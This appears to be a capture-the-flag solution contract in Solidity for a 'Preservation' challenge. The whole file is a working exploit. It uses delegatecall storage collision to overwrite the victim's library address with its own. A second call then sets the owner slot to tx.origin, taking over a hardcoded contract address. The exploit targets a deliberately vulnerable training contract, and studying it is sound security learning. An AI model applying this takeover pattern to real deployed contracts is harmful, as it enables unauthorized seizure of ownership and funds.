// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";

contract Solve {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function run() external {
        Preservation victim = Preservation(0xa9949a21F50d3B1A6e7e0615ea7E9FfD0b5C6Bf4);
        victim.setFirstTime(uint256(uint160(address(this))));
        victim.setFirstTime(uint256(0x1234));
    }

    function setTime(uint256 _temp) public {
        owner = tx.origin;
    }
}